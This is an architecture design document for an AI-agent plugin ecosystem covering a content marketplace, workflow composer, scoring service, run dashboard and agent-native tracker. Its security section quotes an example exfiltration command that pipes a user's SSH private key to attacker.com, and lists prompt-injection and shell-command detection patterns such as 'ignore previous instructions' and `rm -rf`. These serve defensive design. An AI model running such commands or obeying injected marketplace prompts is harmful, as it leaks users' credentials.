# Systems Architecture — ceos-agents Ecosystem

**Author:** Dr. Aravinda Reyes-Chowdhary, Principal Architect
**Date:** 2026-04-23
**Scope:** Integration architecture across 5 components so the ecosystem feels like one product, not a duct-taped bundle.
**Grounding:** ceos-agents v6.9.1 (21 agents, 29 skills, 16 core contracts). Phase 2 research findings dominate this document — in particular: the $20–80/mo WTP ceiling, the commoditization of basic autonomy, and the 60–75% probability that Anthropic ships a native composer/marketplace take-rate within 12–24 months.

**Architectural headline:** We build a **federated content plane (marketplace as GitHub-backed registry) + a thin hosted control plane (composer/scoring/telemetry) + a strictly client-side execution plane (plugin runs inside the user's Claude Code session)**. This keeps us out of the commodity "hosted runtime" price war, lets Anthropic's platform lift us for free, and isolates the one thing we sell — orchestration depth and niche-tracker integration — behind a hard paid gate (hosted tracker + SSO).

---

## 1. Component Inventory — Exact Responsibility Boundaries

| Component | Responsibility (one sentence) | NOT responsibility (explicit negative scope) | Primary user | Data owned | External dependencies |
|---|---|---|---|---|---|
| **Plugin (ceos-agents)** | Orchestrate agents inside a Claude Code session on the user's machine, dispatching skills → agents → git/tracker | NOT a hosted runtime; NOT an LLM; NOT owner of source code or issue data — it only mediates | End developer in their IDE | `.ceos-agents/state.json`, `pipeline.log`, `pipeline-history.md` (local only) | Anthropic API (via Claude Code Skill tool), git CLI, tracker MCP/REST |
| **Marketplace** | Distribute + rate skills/agents/prompts/workflows; serve Claude-grade scores + human reviews; host the composer launcher UI | NOT the executor of any content — execution always happens in the user's Claude Code session or in Vercel Sandbox; NOT a general-purpose npm-like registry | Plugin authors (upload) + developers (install) | Content metadata, ratings, download counts, featured-status flags. Content blobs live in GitHub. | GitHub API (content storage), Claude-grade service, Anthropic API (composer LLM calls), Clerk (auth) |
| **Claude-grade** | Score uploaded agents/skills/prompts deterministically (no LLM) for quality + safety; optionally LLM-improve via paid flow | NOT a benchmark harness for generic LLMs; NOT a runtime — only reads artifacts | Plugin authors + enterprise QA | Score snapshots, scoring rubric versions, historical score deltas per content ID | None (deterministic); Anthropic API only for optional LLM-improve flow |
| **Context Viz** | Render live + post-hoc dashboards of agent runs: token burn, tool invocations, block/retry events, context graph | NOT a debugger; NOT a log aggregator for non-ceos-agents processes; NOT a persistent observability platform | Developer watching a run; support engineer debugging blocked pipelines | Event stream cache (30-day retention); aggregated per-user cost data | `pipeline-history.md` + webhook events from plugin; Claude Code session logs |
| **Tracker + SC** | Agent-native issue + commit store with structured fields agents read/write natively; replaces Jira/Linear *for pipelines*, wraps git (not replaces) for SC | NOT a replacement for GitHub UI (PR review, code browsing); NOT intended for non-agent human-only teams; NOT a new VCS | Engineering teams running agent fleets | Issues with agent-structured schema, agent run lineage, commit-to-issue bidirectional links | Git (libgit2/isomorphic-git wrap), Postgres (issue metadata), Clerk |

**Hard invariant:** The plugin NEVER calls marketplace/composer/tracker backends directly. All outbound calls from the plugin go through `core/post-publish-hook.md` webhooks + MCP servers. This preserves the "plugin works offline against a bare git repo" contract — our hosted services are an *additive* layer, never a dependency.

---

## 2. Autonomous Composer Data Flow

End-to-end flow for: *user clicks "Run" on a prompt "Build Android calorie-tracker app" in the marketplace.*

```
┌─────────────┐                    ┌──────────────────┐
│  Browser    │  1. GET /prompts   │  Marketplace     │
│  (user)     │─────────────────>  │  Next.js/Vercel  │
│             │  <─────── HTML/JSON│  [control plane] │
└──────┬──────┘                    └────────┬─────────┘
       │                                    │
       │ 2. Click "Run"                     │ 3. POST /composer/plan
       │    (OAuth w/ Anthropic             │    { prompt_id, user_id, context }
       │     + our SaaS session)            │    — MP resolves candidate agents
       │                                    │    by querying Claude-grade +
       │                                    │    its own content index
       │                                    ▼
       │                         ┌──────────────────────┐
       │                         │ Composer Service     │
       │                         │ (Vercel Workflow /   │
       │                         │  durable fn)         │
       │                         └──────┬───────────────┘
       │                                │ 4. Returns workflow-plan.json
       │                                │    { agent_ids[], skill_order[],
       │                                │      estimated_cost, claude_grade_scores }
       │                                │
       │<───────────────────────────────┘
       │
       │ 5. User confirms. Browser launches
       │    a deep-link to Claude Code:
       │    claude-code://run?workflow=<signed-url>
       │
       ▼
┌──────────────────────┐
│ Claude Code session  │  6. Plugin receives workflow plan via deep-link +
│ (user's machine)     │     signed-URL fetch. Validates signature against
│ [execution plane]    │     MP's public key (JWT ES256).
│ + ceos-agents plugin │
└──────┬───────────────┘  7. Plugin runs workflow-router skill with the plan:
       │                     - clones workflow as composed pipeline
       │                     - dispatches agents via Claude Code Task tool
       │                     - emits webhook events (pipeline-started,
       │                       step-completed, pipeline-completed) per
       │                       existing post-publish-hook contract
       │
       │  8a. HTTP POST webhooks to Context Viz ingestion endpoint
       │      (run_id correlation)                 ──────────────────┐
       │                                                              │
       │  8b. git push → SC (either GitHub via gh CLI,                │
       │      OR our agent-native SC via libgit2 + signed push)       │
       │                                                              ▼
       │  8c. Tracker issue created/updated         ┌────────────────────┐
       │      via MCP server                        │ Context Viz        │
       │                                            │ (Next.js on Vercel)│
       ▼                                            │ WebSocket push to  │
┌──────────────────────┐                            │ browser            │
│ Tracker (agent-nat)  │                            └─────────┬──────────┘
│ Postgres + REST+MCP  │                                      │
│                      │  9. Tracker emits webhook to         │
│                      │     Marketplace: ComposerRun         │
│                      │     completed → update prompt        │
│                      │     ranking, award XP, etc.          │
└──────────────────────┘                                      │
                                                              │
                                        10. Browser shows live viz dashboard
                                            while Claude Code session runs
                                            on user's machine.
```

**Critical decisions embedded in this diagram:**

1. **The composer runs *planning* on our hosted Workflow fn; *execution* runs client-side in Claude Code.** This is the single most important architectural choice. It means we never pay the Anthropic API bill for the user's workflow (their Claude Code subscription does). We only pay for the planning step (~10K tokens). This kills 90% of the hosting cost and sidesteps Anthropic's Managed Agents price war.

2. **Plugin ↔ Marketplace is one-way pull (deep-link + signed URL).** The plugin never accepts a push from the marketplace. User confirms intent in browser, deep-link hands off to Claude Code, plugin fetches the signed plan. This preserves the "malicious marketplace can't execute code on user's machine silently" trust boundary.

3. **Protocol per arrow:**
   - 1,2: HTTPS + cookie auth (Clerk session)
   - 3,4: HTTPS JSON, internal service-to-service token (AWS IAM-style signed)
   - 5: Custom URL scheme `claude-code://` (same mechanism Cursor uses)
   - 6: HTTPS GET, signature validated via embedded JWT (ES256)
   - 7: Intra-process — Claude Code Skill/Task tools
   - 8a: HTTPS POST (existing webhook contract, already shipped in v6.8.0)
   - 8b: git over HTTPS (standard)
   - 8c: MCP over stdio (existing ceos-agents pattern) OR REST
   - 9: HTTPS webhook
   - 10: WebSocket (Server-Sent Events fallback)

---

## 3. Marketplace Data Model

```
┌───────────────┐     ┌──────────────┐     ┌──────────────┐
│ Organization  │─────│ User         │─────│ ApiKey       │
└───────┬───────┘     └──────┬───────┘     └──────────────┘
        │                    │
        │  owns              │  authors
        │                    │
┌───────▼────────────────────▼───────────────────────────┐
│                 Content (abstract base)                │
│   id (ulid), slug, name, kind ∈ {skill,agent,prompt,  │
│                                  workflow}, org_id,    │
│   author_id, github_repo_url, github_path, version,    │
│   license, visibility ∈ {public,org,private},          │
│   featured: bool                                       │
└───┬────────────────────────────────────────────────────┘
    │
    │ (1:N per content ID; multiple variants)
    │
┌───▼────────────┐   ┌──────────────────┐   ┌──────────────────┐
│ ContentVersion │   │ ClaudeGradeScore │   │ Rating           │
│ semver, sha,   │───│ version, scores  │   │ 1-5 stars, note  │
│ content_hash   │   │ rubric_version   │   │ reviewer_id      │
│ github_tag_ref │   │ issued_at        │   │ composer_run_id  │
└───┬────────────┘   └──────────────────┘   │  (required)      │
    │                                       └──────────────────┘
    │
    │ Prompt variants only: Prompt→PromptVariant
    │ (a prompt named "build-android-app" has variants
    │  "android-kotlin-compose", "android-java-legacy",
    │  "android-flutter-wrapper"). Each variant has its own
    │  ContentVersion + ClaudeGradeScore and is the unit
    │  a composer can pick.
    │
┌───▼──────────────┐
│ Workflow         │  — composed from N agents + M skills
│ components: [    │    (stored as JSON in ContentVersion)
│   { kind, id,    │
│     version } ]  │
└──────────────────┘

┌──────────────────┐
│ ComposerRun      │  — central telemetry entity
│ run_id, user_id, │
│ prompt_id,       │
│ workflow_id,     │
│ started_at,      │
│ completed_at,    │
│ outcome ∈ {ok,   │
│   blocked,       │
│   aborted},      │
│ tokens_total,    │
│ tracker_issue_id │
└──────────────────┘
```

**Central vs. GitHub split:**

- **In GitHub (content repo, one org, one repo per org):** All markdown files (skills, agents, prompts, workflows), `.claude-grade.json` score snapshots committed alongside, CHANGELOG, license. Content ID = `{org}/{repo}@{tag}`.
- **In our Postgres (Neon via Vercel Marketplace):** Ratings, ComposerRun telemetry, download counts, featured flags, user/org identity, search index.

Content blobs NEVER leave GitHub. This lets us fork the marketplace to plain Git cold-backup in 10 minutes if we go bankrupt — OSS-safe.

---

## 4. Identity + Auth

**Recommendation: Clerk as identity broker; users link Anthropic, GitHub, tracker in one dashboard.**

Users have 4 concurrent identities:

1. **Claude Code session** — local Anthropic OAuth, owned by Anthropic.
2. **GitHub account** — for marketplace content contribution.
3. **Our SaaS account** — Pro/Team billing, hosted tracker access.
4. **Tracker account** — IF user uses our agent-native tracker (else their own Jira/YouTrack creds).

**The binding:** Clerk is the primary identity. On first login we ask the user to OAuth-link GitHub (marketplace) + optionally Anthropic (composer API-key pass-through for SSO flows; mostly we rely on Claude Code local session). Tracker uses the same Clerk session via JWT.

**Why not stay with GitHub-only:** Enterprise buyers require SSO/SCIM (the Phase 2 hard gate for OSS→paid conversion). GitHub-only auth excludes 80% of enterprise buyers who don't give devs GitHub seats. Clerk's Enterprise SSO is $500/mo — fastest way to ship SAML/OIDC/SCIM without building it.

**Anti-recommendation:** do NOT build our own auth. Auth0/Clerk is well under 1% of revenue, not worth the breach risk.

---

## 5. Trust Boundaries + Security

Marketplace content is third-party. A malicious prompt could ask Claude Code to `cat ~/.ssh/id_rsa | curl attacker.com`. A malicious agent could do the same. Our defenses:

**Static analysis (pre-publish gate):**
- Regex-based credential pattern check (reuse the 14-pattern `sanitize_block_reason()` POSIX script already in ceos-agents v6.9.0).
- YAML frontmatter schema validator — reject unknown fields.
- Shell-invocation linter: flag any agent that asks Claude to run unrestricted `bash`/`eval`/`curl` + any pattern matching `$(...)` in markdown body. Not a prohibition — warning + displayed on listing page.
- Egress URL allowlist check: any `curl` to a domain outside the user's configured webhook/tracker set triggers a red "external-network-access" badge.

**Claude-grade safety checks (distinct from quality):**
- Separate rubric: `safety.md` — checks for prompt-injection patterns ("ignore previous instructions"), base64-encoded strings in bodies, suspicious `cat`/`curl`/`rm -rf` instructions. Score 0-100, hard-gate at 80 for "Featured" tier, display score for everything else.

**Sandboxed execution (opt-in composer-run-on-our-infra):**
- If the user opts into **Managed Composer Run** (pricing lever — Pro tier), execution runs in **Vercel Sandbox** (Firecracker microVM, 15-min max, no persistent FS). The user's git credentials are injected as scoped deploy tokens, never long-lived PATs.
- Default — and the OSS-safe path — is still **client-side execution**. Sandboxed is a convenience, not a requirement.

**Rate limits + abuse detection:**
- Per-user: 10 composer runs / day on free tier, 100 / day on Pro.
- Per-IP: 1000 API req / hour (Vercel Rate Limiter).
- Abuse detection: run-failure-rate > 50% on a piece of content → auto-unfeature + notify author.

**Featured vs. self-published gate:**
- Self-published: passes static analysis only, shows all Claude-grade scores + any safety warnings.
- Featured: requires (a) Claude-grade overall ≥ 85, (b) safety ≥ 80, (c) author has ≥ 50 human ratings avg ≥ 4.0, (d) manual review by our team. Hard-coded list, not ML.

---

## 6. Hosting / Deploy Strategy Per Component

| Component | Runs where | Stack choice | Rationale |
|---|---|---|---|
| **Plugin** | User's Claude Code session only | Plain markdown, no runtime — already shipped | Zero hosting cost; Anthropic carries the infra; cannot be deprecated by us |
| **Marketplace** | **Next.js on Vercel** | App Router + Clerk auth + Neon Postgres (Vercel Marketplace) + Vercel Blob for screenshots | Best TTFB for content browsing; Vercel Workflow DevKit for the composer; edge deploy means global availability for OSS contributors; we get `claude-api.ts` sample app patterns for free |
| **Claude-grade (scoring service)** | **TypeScript CLI (user-local) + Vercel Serverless API (hosted)** | Same TS code, dual-deploy: CLI wraps `@anthropic-ai/sdk` + deterministic scoring; Vercel Function exposes `/score` for marketplace | The CLI ships today (per user's existing repo). Wrapping it in a Vercel Function takes 1 afternoon. No separate infra to maintain. |
| **Context Viz** | **Next.js on Vercel + WebSocket via Pusher/Ably** | Next.js renders the dashboard, Pusher handles the durable WebSocket channel (Vercel functions can't hold long-lived WS cheaply) | Hosted WS is well under $50/mo for thousands of concurrent users, vs. running our own WS server on Fly.io ($200+ with engineering time) |
| **Tracker + SC** | **Bun server on Fly.io + Postgres on Neon** | Bun for perf + native SQLite for local-dev; Fly.io for sovereign deploy (enterprise prospects may require EU-only) | Vercel Functions timeouts (60s hard) are wrong for long-running agent event ingestion; Fly.io gives us 24/7 containers + region-pinning |

**Single-vendor-minus-one strategy:** Vercel for 4/5 components, Fly.io for the one durable-backend component. This keeps ops simple — one vendor dashboard — but avoids lock-in on the one piece where we need region-pinning for enterprise.

---

## 7. Tracker + Source-Control — "Agent-Native" Defined

**User's claim:** Linear/Jira/GitHub are for humans; ours is for agents. **My architectural translation:**

### Agent-native tracker (build it)

A human-designed issue has a free-text description, freeform labels, and inconsistent AC. An **agent-native issue** has:

```yaml
schema_version: 1.0
issue_id: CEOS-1234
summary: "Checkout button unresponsive on iOS Safari"
acceptance_criteria:
  - id: AC-1
    text: "Button triggers checkout flow on tap"
    verification: { type: browser_e2e, selector: "[data-test=checkout]" }
  - id: AC-2
    text: "No JS errors in console during flow"
    verification: { type: log_scan, pattern: "error" }
complexity: M
reproduction:
  steps: [...]
  fixture: git://fixtures/cart-state.json
affected_areas:
  - path: apps/web/src/checkout/**
agent_lineage:
  - run_id: CEOS-1234_20260423T091200Z
    agents: [triage-analyst, code-analyst, fixer, reviewer]
    outcome: blocked
    block_reason: "AC-2 failed — console.error in OrderReview.tsx:42"
linked_commits: [abc123, def456]
linked_pr: https://github.com/x/y/pull/99
```

The architectural bet: every field is **both human-readable (markdown UI) AND machine-consumable (REST + MCP)**. Agents don't parse prose; they read structured JSON. This is different from Jira + ceos-agents today, where triage-analyst has to regex the description to extract AC.

**Data model extensions over Linear/Jira:**
- First-class `agent_lineage` array — every agent run that touched this issue is recorded, queryable, cost-aggregable.
- First-class `verification` field on each AC — the acceptance-gate agent reads this directly, no re-inference.
- Bidirectional commit↔issue linking via commit-message convention **and** via git notes written by our publisher agent.

### Source control — extended git, NOT fresh VCS

**Strong recommendation: extended git, NOT fresh VCS.**

**Defense of "fresh VCS" = NO:**
- Git dominance is total. Rewriting it is >95% "nobody cares, cold-start, enterprise buyer rejects." Factory.ai, Devin, Cursor all use plain git.
- The 10x claim requires something genuinely 10x better. Agents don't care about merge algorithms; they care about commit metadata, lineage, and fast `git blame`. Git already gives all three.
- Tooling ecosystem (GitHub Actions, pre-commit hooks, Dependabot, gh CLI) is a years-deep moat — we'd be rebuilding years of free infrastructure.

**What "extended git" means:**
- Our **SC layer** is a git server wrapper (think Gitea fork or libgit2 proxy) with:
  - Agent-signed commits — every commit made by a ceos-agents pipeline is signed with a per-agent key. `git log --show-signature` shows `signed-by: ceos-agents-fixer@v6.9.1`. Humans can verify agent commits vs. human commits.
  - Git notes namespace `refs/notes/ceos-agents` auto-populated with run_id + agent lineage.
  - Commit-message schema enforcement on push (hook): conventional-commits + optional `Refs: CEOS-1234` link.
  - REST endpoint `/commit/{sha}/lineage` that returns the agent run that made the commit (ingested from our tracker).
- This means: **users can leave us at any time** — their repo is plain git, they lose only the agent-signed notes. That's the OSS-safe exit ramp that makes enterprise prospects comfortable.

**Against "bundle tracker+SC into one app":** this is an anti-pattern. GitHub tried it, and the split audience (devs want SC, PMs want tracker) means nobody is fully served. Keep them as **separate services that share identity + cross-link data**, not one fused app.

---

## 8. Progressive Integration — Dependency Graph

```
MVP (Week 1-4, required to ship v1)
├── Plugin v6.9.1 (already shipped — no work)
├── Marketplace read-only (GitHub-backed, browse + install flow)
│   └── Claude-grade CLI (already shippable — no work)
└── Composer planning service (thin Vercel Workflow fn)
        ↓
30-day integrations (ship v1.1)
├── Claude-grade API (Vercel Function wrapping the CLI)
├── Marketplace uploads (author flow + GitHub OAuth + static analysis gates)
├── Context Viz MVP (read pipeline-history.md only, no live WS yet)
└── Webhook dispatch from plugin → Context Viz ingestion (uses existing v6.8.0 hook contract)
        ↓
90-day integrations (ship v1.5)
├── Tracker MVP (read-only view + REST + MCP; no full workflow yet)
├── Context Viz live WS (Pusher/Ably)
├── Composer sandboxed execution option (Vercel Sandbox)
├── Human ratings + review flow
└── Clerk SSO/SCIM for enterprise Pro tier
        ↓
Later (6-12mo, v2.0+)
├── Tracker full workflow (AC verification, agent lineage UI)
├── Source-control layer (git server + signed commits)
├── Cross-product deep linking (tracker issue ↔ marketplace workflow ↔ composer run)
├── LLM-improve flow for Claude-grade (paid tier)
└── Self-hosted enterprise edition (Helm chart)
```

**MVP must-connect:** Plugin ↔ Marketplace ↔ Composer ↔ Claude-grade. If any of these four is broken, the product has no value.

**MVP can-delay:** Tracker ↔ Marketplace cross-linking, SC layer entirely, live WebSocket viz, LLM-improve.

---

## 9. Standards + Ecosystem Interop

| Standard | Do we implement it? | Contract |
|---|---|---|
| **MCP (Model Context Protocol)** | YES — expose tracker + marketplace as MCP servers | `ceos-tracker-mcp` and `ceos-marketplace-mcp` published as npm packages. Tools: `tracker.get_issue`, `tracker.create_issue`, `marketplace.search`, `marketplace.install_content`. This is the escape hatch if Claude Code plugin API deprecates — MCP is Anthropic-sanctioned and stable. |
| **Claude Code Skill API** | YES — marketplace items CAN be Skills OR Agents OR Prompts OR Workflows | Skills are the primary unit (maps 1:1 to `skills/*/SKILL.md` in the user's `.claude/` dir). Agents map to `agents/*.md`. Workflows are compositions — stored as a new file type `workflows/*/WORKFLOW.md` with embedded references to skill/agent IDs. We define this WORKFLOW.md schema ourselves (Anthropic has no equivalent yet; if they ship one, we migrate). |
| **GitHub API** | YES — for content storage + SC integration | Use GitHub REST v3 + GraphQL v4. PATs for authors, GitHub App for marketplace-level reads (higher rate limit). Webhooks for push-triggered Claude-grade re-scoring. |
| **Anthropic API** | YES — direct + via SDK | Direct use: composer planning fn. Indirect use: Claude Code session (end user's subscription covers this). Claude-grade uses Anthropic API for the optional LLM-improve flow only — deterministic scoring is LLM-free per existing design. |
| **SCIM 2.0** | YES at 90-day mark — via Clerk | Enterprise tier only. Clerk provides this out of the box; we just enable it. |
| **OpenTelemetry** | NO in MVP; YES at v2.0 | Context Viz at MVP emits custom webhook schema. OTEL export is additive, delayed until we have enterprise customers asking for it. |

---

## 10. Failure Modes — 5 Things That Will Break First

| # | Failure | Symptom | Detection | Recovery |
|---|---|---|---|---|
| 1 | **Composer plans a workflow that the user's Claude Code session can't execute** (missing tracker creds, wrong repo state, missing MCP server) | Plugin emits `outcome:failed` Step Z webhook within first 2 minutes of run | `pipeline-started` webhook → no `step-completed` within 3 min → alert | Composer service pre-flights plan against user's reported env (we capture env fingerprint at deep-link time). Block plan if fingerprint mismatch. Tell user: "Install MCP server X first." |
| 2 | **Claude-grade score drift** — rubric update changes all scores, breaks "Featured" tier retroactively | User complaints on Discord: "My agent was 92 yesterday, 71 today, didn't change anything" | Automated diff scan after every rubric deploy — alert if >10% of content moves >5 points | Snapshot each score with `rubric_version`. UI always shows score + rubric version. Featured gate is on "latest rubric," so we accept that Featured list churns. Author gets 30-day grace period before demotion. |
| 3 | **Malicious prompt bypasses static analysis, exfiltrates user git credentials** during composer run | User reports suspicious `git push` to unknown remote; one user's PAT shows up on a paste site | Cannot detect at runtime (we're not in the session). Detection is social — user reports + PAT revocation. | (a) Signed-URL plan includes allowed remote hosts — plugin blocks `git push` to anything else. (b) Incident response: unfeature the content, revoke author, notify all users who ran it in last 30d. |
| 4 | **GitHub rate limit hit** on marketplace content fetch | Marketplace browse returns 429 | Per-endpoint error rate monitor | Move content fetch to our CDN (Vercel Blob) with GitHub as source of truth + 5-min cache. Authenticated reads use GitHub App token (5000 req/hr vs 60 req/hr anonymous). |
| 5 | **Anthropic deprecates plugin API OR changes Skill invocation semantics** | Existing users report "pipeline broken after Claude Code update" | Regression alert from our canary test project running every 24h | Distribution hedge: already-shipped MCP server variants of ceos-agents skills can be invoked without the plugin API. Phase-3 plan must ensure MCP variant for the top-5 skills (fix-ticket, implement-feature, autopilot, workflow-router, onboard). Fallback CLI invocation path documented in onboard.md. |

---

## Summary of Load-Bearing Decisions

1. **Federated content plane + thin control plane + client-side execution.** We do NOT host execution. Anthropic's API (via the user's Claude Code sub) pays for LLM tokens. We only pay for planning (~10K tokens/run).
2. **Marketplace content lives in GitHub, metadata in our Postgres.** Users can export everything to plain git and leave. OSS-safe exit ramp.
3. **Tracker is agent-native (structured schema + MCP); SC is extended-git (signed commits + notes, NOT fresh VCS).** The tracker is the 10x product; SC is an integration layer. Never rewrite git.
4. **Vercel-primary + Fly.io for the one durable service.** 4/5 components on Vercel; tracker on Fly.io for region pinning.
5. **Clerk for identity.** SSO/SCIM is the enterprise conversion gate per Phase 2 research; building it ourselves is 6 weeks we don't have.
6. **MCP servers alongside the plugin.** Hedge against Anthropic plugin-API deprecation — MCP is Anthropic's sanctioned long-term protocol.
7. **Composer = hosted planner + client executor.** Single most important data-flow decision.

---
*End of architecture document.*
